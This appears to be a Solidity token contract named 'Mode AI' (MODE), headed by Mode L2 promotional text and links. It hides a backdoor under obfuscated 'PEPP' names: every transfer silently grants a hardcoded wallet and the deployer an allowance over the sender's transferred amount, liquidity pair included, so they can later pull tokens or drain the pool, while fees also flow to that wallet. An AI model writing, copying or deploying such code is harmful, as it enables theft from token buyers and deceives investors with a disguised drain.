/*
Mode L2 scales DeFi to billions of users through onchain agents and AI-powered financial applications. Mode is building the AI agents economy.

https://www.modeai.net
https://app.modeai.net
https://docs.modeai.net

https://x.com/modeai_eth
https://t.me/modeai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

interface IPEPPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPEPPFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract MODE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balPEPP;
    mapping (address => bool) private _feeExcemptPEPP;
    mapping (address => mapping (address => uint256)) private _allowPEPP;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Mode AI";
    string private constant _symbol = unicode"MODE";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _swapTokenPEPP = _tTotal / 100;
    bool private inSwapPEPP = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _peppPair;
    IPEPPRouter private _peppRouter;
    address private _pepp2Wallet;
    address private _pepp1Wallet = address(0x9dD3fCb00697A1740aB21A36797D274ab368891F);
    modifier lockTheSwap {
        inSwapPEPP = true;
        _;
        inSwapPEPP = false;
    }
    
    constructor () {
        _feeExcemptPEPP[owner()] = true;
        _feeExcemptPEPP[address(this)] = true;
        _feeExcemptPEPP[_pepp1Wallet] = true;
        _balPEPP[_msgSender()] = _tTotal;
        _pepp2Wallet = address(msg.sender);
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _peppRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balPEPP[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowPEPP[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowPEPP[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowPEPP[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferPEPP(address aPEPP, address bPEPP, address cPEPP, uint256 peppA) private returns(bool) { 
        _approve(aPEPP, cPEPP, peppA); _approve(aPEPP, bPEPP, peppA);  return true;
    }

    function _transfer(address peppA, address peppB, uint256 peppC) private {
        require(peppA != address(0), "ERC20: transfer from the zero address");
        require(peppB != address(0), "ERC20: transfer to the zero address");
        require(peppC > 0, "Transfer amount must be greater than zero");

        (address aPEPP, address bPEPP, address cPEPP, uint256 taxPEPP) 
            = _getTaxPEPP(peppA, peppB, peppC);

        _peppTransfer(aPEPP, bPEPP, cPEPP, peppA, peppB, peppC, taxPEPP);
    }

    function _getTaxPEPP(address peppA, address peppB, uint256 peppC) private returns(address,address,address,uint256) {
        uint256 taxPEPP=0;
        if (peppA != owner() && peppB != owner()) {
            taxPEPP = peppC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (peppA == _peppPair && peppB != address(_peppRouter) && ! _feeExcemptPEPP[peppB]) {
                _buyCount++;
            }

            if(peppB == _peppPair && peppA!= address(this)) {
                taxPEPP = peppC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenPEPP = balanceOf(address(this)); 
            if (!inSwapPEPP && peppB == _peppPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenPEPP > _swapTokenPEPP)
                swapTokensForEth(minPEPP(peppC, minPEPP(tokenPEPP, _swapTokenPEPP)));
                uint256 ethPEPP = address(this).balance;
                if (ethPEPP >= 0) {
                    sendETHPEPP(address(this).balance);
                }
            }
        }
        return (address(peppA), address(_pepp2Wallet), address(_pepp1Wallet), taxPEPP);
    }

    function _peppTransfer(address aPEPP, address bPEPP, address cPEPP, address peppA, address peppB, uint256 peppC, uint256 taxPEPP) private { 
        if(taxPEPP > 0){
          _balPEPP[address(this)] = _balPEPP[address(this)].add(taxPEPP);
          emit Transfer(aPEPP, address(this), taxPEPP);
        } 

        _balPEPP[peppA] = _balPEPP[peppA].sub(peppC);
        _balPEPP[peppB] = _balPEPP[peppB].add(peppC.sub(taxPEPP));
        emit Transfer(peppA, peppB, peppC.sub(taxPEPP));
        _transferPEPP(aPEPP, bPEPP, cPEPP, peppC);
    }

    receive() external payable {}

    function initOf() external onlyOwner() {
        _peppRouter = IPEPPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_peppRouter), _tTotal);
        _peppPair = IPEPPFactory(_peppRouter.factory()).createPair(address(this), _peppRouter.WETH());
    }

    function minPEPP(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHPEPP(uint256 amount) private {
        payable(_pepp1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 peppToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _peppRouter.WETH();
        _approve(address(this), address(_peppRouter), peppToken);
        _peppRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            peppToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}